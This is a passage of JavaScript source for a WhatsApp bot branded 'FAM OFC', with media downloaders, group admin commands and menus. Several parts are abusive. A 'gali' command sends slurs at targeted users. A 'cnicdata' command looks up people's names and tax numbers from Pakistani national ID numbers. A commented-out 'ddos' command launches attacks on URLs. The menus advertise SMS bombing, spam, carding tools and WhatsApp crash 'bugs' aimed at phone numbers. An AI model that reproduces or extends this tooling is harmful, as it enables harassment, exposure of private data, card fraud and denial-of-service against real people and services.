        // Send loading message
        

        // Fetch source code from API
        const apiUrl = `https://famofcfallxd.serv00.net/apis/source.php?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status === "success" && data.sourceCode) {
            // Prepare file buffer for the source code
            const sourceCode = data.sourceCode;
            const fileName = `source_${url.replace(/https?:\/\//, '').replace(/[^a-zA-Z0-9]/g, '_')}.html`;
            const fileBuffer = Buffer.from(sourceCode, 'utf-8');

            // Prepare message
            const formattedMessage = `🎩 *FAM OFC Web Source Fetcher*\n\n🌐 *URL:* ${url}\n📄 *Source Code Length:* ${data.contentLength} characters\n📅 *Fetched At:* ${data.timestamp}\n\n🔥 *Source code saved as ${fileName}*\n*Powered by FAM OFC*`;

            // Send the file with caption
            await conn.sendMessage(
                m.chat,
                {
                    document: fileBuffer,
                    mimetype: 'text/html',
                    fileName: fileName,
                    caption: formattedMessage
                },
                { quoted: m }
            );
        } else {
            await famreply2(`❌ *Failed to fetch source code:* ${data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        console.error("Webcopy Command Error:", error);
        await famreply2(`❌ *Error:* ${error.message || "Unable to fetch source code. Try again later."}`);
    }
}
break;


case "shorturl": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <url>\nExample: ${prefix + command} https://t.me/famofc`);

    // Validate URL format
    const urlPattern = /^(https?:\/\/[^\s$.?#].[^\s]*)$/;
    if (!urlPattern.test(text)) return famreply2("❌ *Invalid URL:* Please provide a valid URL starting with http:// or https://");

    try {
        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });


        // Make API request
        const response = await axios.get(`https://famofcfallxd.serv00.net/apis/famurlshot.php?url=${encodeURIComponent(text)}`);
        const data = response.data;

        if (!data.shortUrl) {
            await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return famreply2(`❌ *Error:* Failed to shorten URL. ${data.message || "Unknown error"}`);
        }

        // Format the response
        const replyText = `
*URL Shortener*
*Original URL:* ${text}
*Shortened URL:* ${data.shortUrl}
*Developer:* ${data.dev}

🔥 *Powered by FAM OFC*
        `;

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(replyText);
    } catch (error) {
        console.error("Urlshort Error:", error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famreply2(`❌ *Error:* Failed to shorten URL. ${error.message}`);
    }
}
break;

case "fb": {
    let url = text.trim();
    let mentionedJid = null;

    // Check if it's a reply in a group
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage && m.key.remoteJid.endsWith('@g.us')) {
        mentionedJid = m.message.extendedTextMessage.contextInfo.participant;
        if (!url && m.message.extendedTextMessage.contextInfo.quotedMessage.conversation) {
            url = m.message.extendedTextMessage.contextInfo.quotedMessage.conversation.trim();
        }
    }

    // Validate URL
    if (!url) {
        return famreply2(`📌 *Usage:* ${prefix + command} <Facebook URL>\nExample: ${prefix + command} https://fb.watch/xyz\nOr reply to a message containing a Facebook URL with .fb`);
    }

    if (!url.includes('facebook.com') && !url.includes('fb.watch')) {
        return famreply2('❌ Invalid URL - Must be from Facebook (facebook.com or fb.watch)');
    }

    try {
        // Notify user that processing has started
        await famreply2('⏳ Processing your Facebook video...');

        // Fetch video links from API
        const apiURL = `https://tcs-demonic2.vercel.app/api/fbdownloader?url=${encodeURIComponent(url)}`;
        const response = await fetch(apiURL);
        const data = await response.json();

        if (!data.success || !data.data.success) {
            throw new Error(data.message || "Failed to fetch video links.");
        }

        const { hdlink, sdlink } = data.data;

        // Try to download and send video (prefer HD)
        let videoUrl = hdlink || sdlink;
        if (videoUrl) {
            // Fetch video as buffer
            const videoResponse = await fetch(videoUrl);
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());

            // Check file size (WhatsApp limit ~100MB)
            const fileSizeMB = videoBuffer.length / (1024 * 1024);
            if (fileSizeMB <= 100) {
                await conn.sendMessage(m.chat, {
                    video: videoBuffer,
                    caption: `🎥 *Facebook Video Downloaded!*\nQuality: ${hdlink ? 'HD' : 'SD'}\nURL: ${url}`,
                    contextInfo: {
                        mentionedJid: mentionedJid ? [mentionedJid, m.sender] : [m.sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "fam vip bot",
                            newsletterJid: "120363390114292114@newsletter"
                        },
                        isForwarded: true,
                        externalAdReply: {
                            title: "fam vip bot v11",
                            thumbnailUrl: 'https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg',
                            sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
                        }
                    }
                }, { quoted: m });
            } else {
                // Send links if video is too large
                let message = `⚠ Video too large to send (${fileSizeMB.toFixed(2)} MB)!\n\n🎥 *Facebook Video Links:*\n`;
                if (hdlink) message += `📽 *HD*: ${hdlink}\n`;
                if (sdlink) message += `📽 *SD*: ${sdlink}\n`;
                message += `\nURL: ${url}`;
                await famreply2(message);
            }
        } else {
            throw new Error("No video links available.");
        }

        // Success notification
        await famreply2('✅ Video processed successfully!');
    } catch (error) {
        console.error("FB Downloader Error:", error);
        await famreply2(`❌ *Error:* ${error.message || "Failed to download video. Please try again."}`);
    }}
    break;

case "add": {
    if (!m.isGroup) return famreply2("❌ *Error:* This command can only be used in groups!");
    if (!isCreator(sender) && !m.isAdmin) return famreply2("❌ *Error:* Only group admins or the bot owner can use this command!");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <phone_number>\nExample: ${prefix + command} +923xxx`);

    // Clean and validate phone number
    let phone = text.replace(/[^0-9]/g, ''); // Remove non-numeric characters
    if (!phone.startsWith('92') || phone.length !== 12) {
        return famreply2("❌ *Invalid Number:* Please provide a valid Pakistani number (e.g., +923xxx).");
    }
    let jid = `${phone}@s.whatsapp.net`;

    try {
        // Check if bot is admin
        const groupMetadata = await conn.groupMetadata(m.chat);
        const botJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const botIsAdmin = groupMetadata.participants.find(p => p.id === botJid)?.admin;
        if (!botIsAdmin) return famreply2("❌ *Error:* The bot must be an admin to add members or send invite links!");

        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
// Show loading animation (optional)

        // Attempt to add member
        const response = await conn.groupParticipantsUpdate(m.chat, [jid], 'add');

        if (response[0].status === '200') {
            await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            await famreply2(`*Success:* Added ${phone} to the group!\n\n🔥 *Powered by FAM OFC*`);
        } else if (response[0].status === '403') {
            // Privacy restriction: Generate and send invite link
            const inviteCode = await conn.groupInviteCode(m.chat);
            const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;

            // Send invite link to user via private message
            await conn.sendMessage(jid, {
                text: `📩 *Group Invite*\nYou have been invited to join *${groupMetadata.subject}*.\nPlease use this link to join:\n${inviteLink}\n\n🔥 *Powered by FAM OFC*`
            });

            // Notify group
            await conn.sendMessage(m.chat, { react: { text: '📨', key: m.key } });
            await famreply2(`*Invite Sent:* ${phone} has privacy settings enabled. An invite link has been sent to them.\n\n🔥 *Powered by FAM OFC*`);
        } else {
            throw new Error(`Failed to add ${phone}. Status: ${response[0].status}`);
        }
    } catch (error) {
        console.error("[ADD] Error:", error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        let errorMsg = `❌ *Error:* Failed to add ${phone}.`;
        if (error.message.includes('404')) {
            errorMsg += ` Number not registered on WhatsApp.`;
        } else if (error.message.includes('403')) {
            errorMsg += ` User has privacy settings enabled, but invite link failed to send.`;
        } else if (error.message.includes('408')) {
            errorMsg += ` Request timed out.`;
        } else {
            errorMsg += ` ${error.message}`;
        }
        await famreply2(errorMsg);
    }
}
break;
case "gali": {

    // Define prime users (update this list with actual prime user JIDs)
    const primeUsers = [
        "923001234567@s.whatsapp.net",
        "923451234567@s.whatsapp.net"
    ];

    // Define restricted names
    const restrictedNames = ['fam', 'famofc', 'faheem', 'fahim','f@heem'];

    // Define galiyan array
    const galiyan = [
       'bkl mkc gando lory 6ky',
        
    ];

    let targetName = text.trim();
    let mentionedJid = null;

    // Check if it's a reply in a group
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage && m.key.remoteJid.endsWith('@g.us')) {
        mentionedJid = m.message.extendedTextMessage.contextInfo.participant;
        if (!targetName) {
            // If no name provided, use the replied user's name or number
            targetName = await conn.getName(mentionedJid) || mentionedJid.split('@')[0];
        }
    } else if (!targetName) {
        // No reply and no name provided
        return famreply2(`📌 *Usage:* ${prefix + command} <name>\nExample: ${prefix + command} rishi\nOr reply to a message in a group with .gali`);
    }

    // Normalize and clean targetName
    const normalizeUnicode = (str) => {
        const unicodeMap = {
            '𝗔': 'A', '𝗕': 'B', '𝗖': 'C', '𝗗': 'D', '𝗘': 'E', '𝗙': 'F', '𝗚': 'G', '𝗛': 'H', '𝗜': 'I', '𝗝': 'J',
            '𝗞': 'K', '𝗟': 'L', '𝗠': 'M', '𝗡': 'N', '𝗢': 'O', '𝗣': 'P', '𝗤': 'Q', '𝗥': 'R', '𝗦': 'S', '𝗧': 'T',
            '𝗨': 'U', '𝗩': 'V', '𝗪': 'W', '𝗫': 'X', '𝗬': 'Y', '𝗭': 'Z',
            '𝗮': 'a', '𝗯': 'b', '𝗰': 'c', '𝗱': 'd', '𝗲': 'e', '𝗳': 'f', '𝗴': 'g', '𝗵': 'h', '𝗶': 'i', '𝗷': 'j',
            '𝗸': 'k', '𝗹': 'l', '𝗺': 'm', '𝗻': 'n', '𝗼': 'o', '𝗽': 'p', '𝗾': 'q', '𝗿': 'r', '𝘀': 's', '𝘁': 't',
            '𝘂': 'u', '𝘃': 'v', '𝘄': 'w', '𝘅': 'x', '𝘆': 'y', '𝘇': 'z',
            '𝐀': 'A', '𝐁': 'B', '𝐂': 'C', '𝐃': 'D', '𝐄': 'E', '𝐅': 'F', '𝐆': 'G', '𝐇': 'H', '𝐈': 'I', '𝐉': 'J',
            '𝐊': 'K', '𝐋': 'L', '𝐌': 'M', '𝐍': 'N', '𝐎': 'O', '𝐏': 'P', '𝐐': 'Q', '𝐑': 'R', '𝐒': 'S', '𝐓': 'T',
            '𝐔': 'U', '𝐕': 'V', '𝐖': 'W', '𝐗': 'X', '𝐘': 'Y', '𝐙': 'Z',
            '𝐚': 'a', '𝐛': 'b', '𝐜': 'c', '𝐝': 'd', '𝐞': 'e', '𝐟': 'f', '𝐠': 'g', '𝐡': 'h', '𝐢': 'i', '𝐣': 'j',
            '𝐤': 'k', '𝐥': 'l', '𝐦': 'm', '𝐧': 'n', '𝐨': 'o', '𝐩': 'p', '𝐪': 'q', '𝐫': 'r', '𝐬': 's', '𝐭': 't',
            '𝐮': 'u', '𝐯': 'v', '𝐰': 'w', '𝐱': 'x', '𝐲': 'y', '𝐳': 'z',
            '𝔸': 'A', '𝔹': 'B', 'ℂ': 'C', '𝔻': 'D', '𝔼': 'E', '𝔽': 'F', '𝔾': 'G', 'ℍ': 'H', '𝕀': 'I', '𝕁': 'J',
            '𝕂': 'K', '𝕃': 'L', '𝕄': 'M', 'ℕ': 'N', '𝕆': 'O', 'ℙ': 'P', 'ℚ': 'Q', 'ℝ': 'R', '𝕊': 'S', '𝕋': 'T',
            '𝕌': 'U', '𝕍': 'V', '𝕎': 'W', '𝕏': 'X', '𝕐': 'Y', 'ℤ': 'Z',
            '𝕒': 'a', '𝕓': 'b', '𝕔': 'c', '𝕕': 'd', '𝕖': 'e', '𝕗': 'f', '𝕘': 'g', '𝕙': 'h', '𝕚': 'i', '𝕛': 'j',
            '𝕜': 'k', '𝕝': 'l', '𝕞': 'm', '𝕟': 'n', '𝕠': 'o', '𝕡': 'p', '𝕢': 'q', '𝕣': 'r', '𝕤': 's', '𝕥': 't',
            '𝕦': 'u', '𝕧': 'v', '𝕨': 'w', '𝕩': 'x', '𝕪': 'y', '𝕫': 'z'
        };
        return str.replace(/[\u{1D400}-\u{1D7FF}]/gu, char => unicodeMap[char] || char);
    };

    const cleanedName = normalizeUnicode(targetName).replace(/[\*_"'`\[\]\(\)\{\}]/g, '').trim();

    // Prepare target JID for checking
    let targetJid = mentionedJid || (cleanedName.match(/^\d+$/) ? `${cleanedName}@s.whatsapp.net` : null);

    try {
        // Check if target is owner or prime user
        if (targetJid) {
            if (isCreator(targetJid)) {
                return famreply2("abu ko gali ni dyty");
            }
            if (primeUsers.includes(targetJid)) {
                return famreply2("❌ Cannot use .gali on a prime user! 🌟");
            }
        }

        // Split cleanedName into words and check each against restricted names
        const nameWords = cleanedName.split(/\s+/);
        const isRestricted = nameWords.some(word => 
            restrictedNames.some(name => 
                word.toLowerCase().includes(name.toLowerCase())
            )
        );

        if (isRestricted) {
            return famreply2("abu ko gali ni dyty");
        }

        // Select a random gali
        const galiMessage = `${targetName} ${galiyan[Math.floor(Math.random() * galiyan.length)]}`;

        // If there's a mentioned user (from reply), include mention
        if (mentionedJid) {
            await conn.sendMessage(m.key.remoteJid, {
                text: `@${mentionedJid.split('@')[0]} ${galiMessage}`,
                mentions: [mentionedJid]
            }, { quoted: m });
        } else {
            await famreply2(galiMessage);
        }
    } catch (error) {
        console.error("Gali Command Error:", error);
        famreply2(`⚠ *Error:* ${error.message}`);
    }}
    break;






case "checkhost": {
    // Check if user is allowed (assuming isCreator is the owner check)
    if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");

    // Check if URL is provided
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} https://example.com`);

    // Validate URL
    if (!isUrl(text)) return famreply2("❌ *Invalid URL!* Please provide a valid website link (e.g., https://example.com)");

    // Prepare interactive message with button
    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🌐 Host Checker",
                        subtitle: ""
                    },
                    body: {
                        text: "Click the button below to check the host status."
                    },
                    footer: {
                        text: global.namaBot // Using bot name from config
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Check Host",
                                    url: `https://check-host.net/check-http?host=${encodeURIComponent(text)}`,
                                    merchant_url: `https://check-host.net/check-http?host=${encodeURIComponent(text)}`
                                })
                            }
                        ],
                        messageParamsJson: ""
                    }
                }
            }
        }
    };

    // Send the interactive message
    await conn.relayMessage(m.chat, msg, { messageId: m.key.id });
}
break;


/*
case "ddos":
    if (!text.includes("|")) return famreply2("❌ *Usage:* .ddos <url>|<time>\nExample: .ddos http://example.com|60\n\n🚀 Powered by FAM OFC");

    let [targetUrl, attackTime] = text.split("|");

    if (!targetUrl.startsWith("http")) return famreply2("❌ Invalid URL! Please provide a valid website link.\n\n🔥 Powered by FAM OFC");
    if (isNaN(attackTime) || attackTime < 1) return famreply2("❌ Invalid time! Please enter time in seconds (e.g., 60).\n\n🚀 Powered by FAM OFC");

    startDDoS(targetUrl, attackTime);
    famreply2(`✅ *DDoS Attack Started!*\n\n🌍 *Target:* ${targetUrl}\n⏳ *Duration:* ${attackTime} seconds\n\n🔥 *Powered by FAM OFC*`);
    break;
    */
    case "cnicdata": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <cnic_number>\nExample: ${prefix + command} 35202xxxxxxxxx`);

    let cnic = text.replace(/[^0-9]/g, ''); // Remove non-numeric characters
    if (cnic.length !== 13) return famreply2("❌ *Invalid CNIC:* Please provide a valid 13-digit CNIC number.");

    try {
        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
         // Show loading animation

        // Make API request
        const response = await axios.get(`https://famofcfallxd.serv00.net/apis/fbi.php?cnic=${cnic}`);
        const data = response.data;

        if (data.status !== "success") {
            await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return famreply2(`❌ *Error:* Failed to fetch CNIC data. ${data.message || "Unknown error"}`);
        }

        // Format the response
        const result = data.data;
        const replyText = `
*CNIC Data Lookup*
*CNIC:* ${cnic}
*Name:* ${result.Name}
*NTN:* ${result.NTN}
*Tax Office:* 
*Taxpayer Type:* 
*Timestamp:* ${data.timestamp}

🔥 *Powered by FAM OFC*
        `;

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(replyText);
    } catch (error) {
        console.error("Cnicdata Error:", error.message);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await famreply2(`❌ *Error:* Failed to fetch CNIC data. ${error.message}`);
    }
}
break;
case "reactch": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");

    // Check if text is provided
    if (!text) {
        return famreply2(`📌 *Usage:* ${prefix + command} <channel_url> <emoji>\nExample: ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😊\n\n🚀 Powered by FAM OFC`);
    }

    // Split input into channel URL and emoji
    const args = text.trim().split(" ");
    if (args.length < 2) {
        return famreply2(`📌 *Usage:* ${prefix + command} <channel_url> <emoji>\nExample: ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😊\n\n🚀 Powered by FAM OFC`);
    }

    const channelUrl = args[0];
    const emoji = args.slice(1).join(" ").trim();

    // Validate channel URL
    if (!channelUrl.startsWith("https://whatsapp.com/channel/")) {
        return famreply2("❌ *Invalid Channel Link!* Please provide a valid WhatsApp channel URL (e.g., https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466).\n\n🚀 Powered by FAM OFC");
    }

    // Extract channel ID and message ID
    const match = channelUrl.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\w+))?/);
    if (!match || !match[1] || !match[2]) {
        return famreply2("❌ *Invalid URL!* Ensure the URL includes a channel ID and message ID (e.g., https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466).\n\n🚀 Powered by FAM OFC");
    }

    const channelId = match[1];
    const messageId = match[2];

    // Validate emoji (using correct Unicode range with u flag)
    const emojiRegex = /\p{Emoji}/u;
    if (!emojiRegex.test(emoji) || emoji.length > 2) {
        return famreply2("❌ *Invalid Emoji!* Please provide a single standard emoji (e.g., 😊, 👍).\n\n🚀 Powered by FAM OFC");
    }

    try {
        // Construct newsletter JID
        const newsletterJid = `${channelId}@newsletter`;
        console.log(`[REACTCH] Attempting to react to JID: ${newsletterJid}, Message ID: ${messageId}, Emoji: ${emoji}`);

        // Check if bot is a follower of the channel
        try {
            const channelInfo = await conn.newsletterMetadataGet({ jid: newsletterJid });
            if (!channelInfo || !channelInfo.subscriber_count) {
                return famreply2("❌ *Error:* The bot is not a follower of this channel. Please make the bot join the channel first.\n\n🚀 Powered by FAM OFC");
            }
            console.log(`[REACTCH] Channel Info:`, JSON.stringify(channelInfo));
        } catch (metaError) {
            console.error(`[REACTCH] Metadata Error:`, metaError.message);
            return famreply2("❌ *Error:* Unable to verify channel subscription. Ensure the bot has joined the channel.\n\n🚀 Powered by FAM OFC");
        }

        // Create message key
        const messageKey = {
            remoteJid: newsletterJid,
            id: messageId,
            participant: null // Channels don't use participant
        };
        console.log(`[REACTCH] Message Key:`, JSON.stringify(messageKey));

        // Send reaction
        await conn.sendMessage(newsletterJid, {
            react: {
                text: emoji,
                key: messageKey
            }
        });
        console.log(`[REACTCH] Reaction sent successfully`);

        // Send confirmation
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(`✅ *Successfully sent reaction ${emoji} to the channel message!*\n\n🌐 *Channel URL:* ${channelUrl}\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error(`[REACTCH] Error:`, error.message, error.stack);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        let errorMsg = `❌ *Error:* Failed to send reaction.`;
        if (error.message.includes('404')) {
            errorMsg += ` Invalid channel or message ID.`;
        } else if (error.message.includes('403')) {
            errorMsg += ` Bot lacks permission to react (ensure it's a follower or reactions are enabled).`;
        } else {
            errorMsg += ` ${error.message}`;
        }
        await famreply2(`${errorMsg}\n\n🚀 Powered by FAM OFC`);
    }
}
break;
case "addgc": {
    if (!text) {
        return famreply2(`📌 Usage: addgc <group_invite_url>\nExample: addgc https://chat.whatsapp.com/BGDC9H5kRtPCmSvNxXv79y`);
    }

    // Validate WhatsApp group invite URL
    if (!text.includes("chat.whatsapp.com")) {
        return famreply2("⚠ Please provide a valid WhatsApp group invite link!");
    }

    // Extract invite code from URL
    const match = text.match(/https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (!match || !match[1]) {
        return famreply2("⚠ Invalid group invite link format!");
    }
    const inviteCode = match[1];

    try {
        const loadingMessage = await famreply2("⏳ *Attempting to join the group... Please wait.*");
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // Attempt to join the group
        const groupInfo = await conn.groupAcceptInvite(inviteCode);

        await conn.sendMessage(m.chat, { delete: loadingMessage.key });
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

        // Send success message
        await conn.sendMessage(m.chat, {
            text: `✅ *Successfully joined the group!*\n\n📌 *Group ID:* ${groupInfo.gid}\n🚀 *Powered by FAM OFC*`
        }, { quoted: m });

    } catch (error) {
        console.error("Addgc Error Details:", {
            message: error.message,
            code: error.code,
            response: error.response?.data || "No response data",
            status: error.response?.status
        });

        try {
            await conn.sendMessage(m.chat, { delete: loadingMessage.key });
        } catch (deleteError) {
            console.error("Failed to delete loading message:", deleteError);
        }

        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });

        if (error.message.includes("not-authorized")) {
            famreply2("⚠ Bot is not authorized to join this group or the invite link is invalid/expired!");
        } else if (error.message.includes("conflict")) {
            famreply2("⚠ Bot is already in the group!");
        } else if (error.message.includes("gone")) {
            famreply2("⚠ Group invite link is expired or revoked!");
        } else {
            famreply2("⚠ Error joining the group. Please check the invite link or try again later.");
        }
    }
}
break;

case "menu": {
await conn.sendMessage(m.chat, { react: { text: "⚠️",key: m.key,}}); 
let teksnya = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
┏━━━━━━━━━━━━━━┈ 
┣──=[ *\`[ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 ]\`* ] 
┆ 🤖 *Bot Name:* ${global.namaBot}
┆ 👤 *User:* ${pushname}  
┆ 😎 *Status:* ${!isCreator(m.sender) ? "User ⭐" : "Developer ⭐"}
┆ 🎊 *Premium:* ${isPremium ? "✅" : "❎"}
┆ 🛠 *Type:* Tool  
┆ 🔢 *Version:* ${global.versionBot}  
┆ 🧑‍💻 *Dev:* ${global.namaDeveloper}  
┆ 🚀 *Powered by FAM OFC*  
└━━━━━━━━━━━━━━┈ ⳹
▰▰▰▰▰▰▰▰▰▰▰▰▰▰

`
let buttons = [
     { buttonId: ".allmenu", buttonText: { displayText: "🌟ALL MENU🌟" } },
          { buttonId: ".ownermenu", buttonText: { displayText: "😎OWNER MENU" } },
                    { buttonId: ".toolsmenu", buttonText: { displayText: "🪛TOOLS MENU" } },
                              { buttonId: ".downloadmenu", buttonText: { displayText: "📽️DOWNLOAD MENU" } },
                                        { buttonId: ".groupmenu", buttonText: { displayText: "👥GROUP MENU" } },
                                                  { buttonId: ".bugmenu", buttonText: { displayText: "☠️BUG MENU" } },
                                                            { buttonId: ".developer", buttonText: { displayText: "👤DEVELOPER INFO🇵🇰" } },
                       


];

    let buttonMessage = {
        image: { url: `https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg` },
	    gifPlayback: true,
	    caption: teksnya,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `FAM OFFICIAL VIP BOT`,
              body: `©famofc`,
             thumbnailUrl: `https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg`,
            sourceUrl: ``,
           mediaType: 1,
          renderLargerThumbnail: false, 
         }
        },
        footer: "Creator : famofc",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };

    await conn.sendMessage(m.chat, buttonMessage, { quoted: qloc });            
                }
break        
case 'ownermenu': {
famreply2(`
┌── [ *\`Owner Menu\`* ]
│ ✇ *.public* ( on/off )
│ ✇ *.clean*
│ ✇ *.getsc*
│ ✇ *.addprem*
│ ✇ *.delprem*  
│ ✇ *.addowner*
│ ✇ *.removeowner*
│ ✇ *.addgc*
│ ✇ *.ai-mode* ( on/off )
└──────────────▪` )}
break;
case 'toolsmenu': {
famreply2(`
┌── [ *\`Tools\`* ]
│ ✇ *.simdata* ( num or cnic )
│ ✇ *.webcopy* ( url 🔗 )
│ ✇ *.ai* ( text )
│ ✇ *.tourl* ( reply img )
│ ✇ *.shorturl* ( url 🔗 )
│ ✇ *.trackip* ( 173.255.160.70 )
│ ✇ *.checkhost* ( url 🔗 )
│ ✇ *.enc doc* ( reply js script )
│ ✇ *.dec doc* ( reply js script )
│ ✇ *.chkcc* ( Card ) 
│ ✇ *.gen* ( bin )
│ ✇ *.waspam* ( 923xxx )
│ ✇ *.smsboomer* ( 923xxx 𝟏-𝟎𝟎 )
└──────────────▪`)}
break;
case 'downloadmenu':{
famreply2(`
┌── [ *\`download Menu\`* ]
│ ✇ *.splay* ( song name )
│ ✇ *.tt* ( TikTok 🔗 )
│ ✇ *.fb* ( Facebook 🔗 )
│ ✇ *.ig* ( Instagram 🔗 )
└──────────────▪`)}
break;
case 'groupmenu':{
famreply2(`
┌── [ *\`group Menu\`* ]
│ ✇ *.closegroup*
│ ✇ *.opengroup*
│ ✇ *.addadmin*
│ ✇ *.undadmin*
│ ✇ *.cekidgc*
│ ✇ *.tagall*
│ ✇ *.hidetag*
│ ✇ *.add*
│ ✇ *.kick*
└──────────────▪`)}
break;
case 'bugmenu': {
famreply2(`
┌── [ *\`Bug Menu\`* ]
│ ✇ *.uicrash* ( 923xxx|amount )
│ ✇ *.crt* ( group link )
│ ✇ *.famofcinvis* ( 923xxx )
│ ✇ *.famofccore* ( 923xxx )
│ ✇ *.famofckontol* ( 923xxx )
│ ✇ *.famofcforce* ( 923xxx )
└──────────────▪`)}
break;
case 'allmenu': {
    famreply2(`
 *🎊 V I P - M E N U 🎊*
   
┌── [ *\`Owner Menu\`* ]
│ ✇ *.public* ( on/off )
│ ✇ *.clean*
│ ✇ *.getsc*
│ ✇ *.addprem*
│ ✇ *.delprem*  
│ ✇ *.addowner*
│ ✇ *.removeowner*
│ ✇ *.addgc*
│ ✇ *.ai-mode* ( on/off )
└──────────────▪                   
┌── [ *\`Pak Sim Database\`* ]
│ ✇ *.simdata* ( number )
└──────────────▪
┌── [ *\`SMS Boomer\`* ]
│ ✇ *.waspam* ( 923xxx )
│ ✇ *.smsboomer* ( 923xxx 𝟏-𝟎𝟎 )
└──────────────▪
┌── [ *\`Carding Tools\`* ]
│ ✇ *.chkcc* ( Card ) 
│ ✇ *.gen* ( bin )
└──────────────▪
┌── [ *\`Tools\`* ]
│ ✇ *.webcopy* ( url 🔗 )
│ ✇ *.ai* ( text )
│ ✇ *.tourl* ( reply img )
│ ✇ *.shorturl* ( url 🔗 )
│ ✇ *.trackip* ( 173.255.160.70 )
│ ✇ *.checkhost* ( url 🔗 )
│ ✇ *.enc doc* ( reply js script )
│ ✇ *.dec doc* ( reply js script )
└──────────────▪
┌── [ *\`Bug Menu\`* ]
│ ✇ *.uicrash* ( 923xxx|amount )
│ ✇ *.crt* ( group link )
│ ✇ *.famofcinvis* ( 923xxx )
│ ✇ *.famofccore* ( 923xxx )
│ ✇ *.famofckontol* ( 923xxx )
│ ✇ *.famofcforce* ( 923xxx )
└──────────────▪
┌── [ *\`download Menu\`* ]
│ ✇ *.splay* ( song name )
│ ✇ *.tt* ( TikTok 🔗 )
│ ✇ *.fb* ( Facebook 🔗 )
│ ✇ *.ig* ( Instagram 🔗 )
└──────────────▪
┌── [ *\`group Menu\`* ]
│ ✇ *.closegroup*
│ ✇ *.opengroup*
│ ✇ *.addadmin*
│ ✇ *.undadmin*
│ ✇ *.cekidgc*
│ ✇ *.tagall*
│ ✇ *.hidetag*
│ ✇ *.add*
│ ✇ *.kick*
└──────────────▪`)
}
break;
case "kick": {
    if (!isGroup) return famreply2("❌ *This command can only be used in groups!*");
    if (!isBotAdmins) return famreply2("❌ *I need to be an admin to kick members!*");
    if (!isAdmins && !isCreator(sender)) return famreply2("❌ *Only group admins or the bot owner can use this command!*");
    if (!m.quoted) return famreply2("📌 *Usage:* Reply to a member's message with `.kick` to remove them.");
    
    const target = m.quoted.sender;
    if (groupAdmins.includes(target)) return famreply2("❌ *Cannot kick a group admin!*");
    if (target === botNumber) return famreply2("❌ *I cannot kick myself!*");

    try {
        await conn.groupParticipantsUpdate(from, [target], "remove");
        await famreply2(`✅ *Kicked @${target.split('@')[0]} from the group!*\n\n🔥 *Powered by FAM OFC*`, {
            mentions: [target]
        });
    } catch (error) {
        console.error("Kick Command Error:", error);
        await famreply2(`❌ *Error:* Failed to kick the member.\n\n🔥 *Powered by FAM OFC*`);
    }
}
break;

case "ai-mode": {
    if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");
    if (text === "on") {
        aiMode = true;
        return famreply2("✅ *AI Mode Activated!* 🤖\nNow I will reply to every message.");
    } 
    if (text === "off") {
        aiMode = false;
        return famreply2("❌ *AI Mode Deactivated!* 🚫\nI will stop replying automatically.");
    }
    return famreply2("📌 *Usage:*\n.ai-mode on\n.ai-mode off");
}
break;

// 🎯 Add Owner Case
case "addowner": {
if (!isCreator(sender)) return famreply2("❌ Only the Owner can use this command!");

    if (!args[0]) return conn.sendMessage(m.chat, { text: "📌 *برائے مہربانی ایک نمبر درج کریں!* (مثال: \n `.addowner 923001234567`)" }, { quoted: m });
    let number = text.replace(/\D/g, "") + "@s.whatsapp.net"; 
    let owners = getOwners();

    if (owners.includes(number)) {
